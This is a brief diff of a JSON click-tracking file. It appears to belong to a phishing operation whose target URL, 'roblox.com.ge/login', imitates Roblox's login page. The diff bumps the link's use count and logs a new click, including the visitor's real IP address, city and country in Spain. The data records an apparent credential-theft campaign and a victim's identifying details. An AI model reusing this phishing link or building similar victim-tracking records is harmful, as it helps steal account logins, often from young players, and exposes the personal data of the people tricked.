@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1701,
+    "useCount": 1702,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13776,6 +13776,14 @@
         "city": "Curitiba",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777670828826,
+        "ip": "213.94.23.180",
+        "country": "Spain",
+        "city": "La Unión",
+        "flag": "🇪🇸",
+        "countryCode": "ES"
       }
     ]
   },
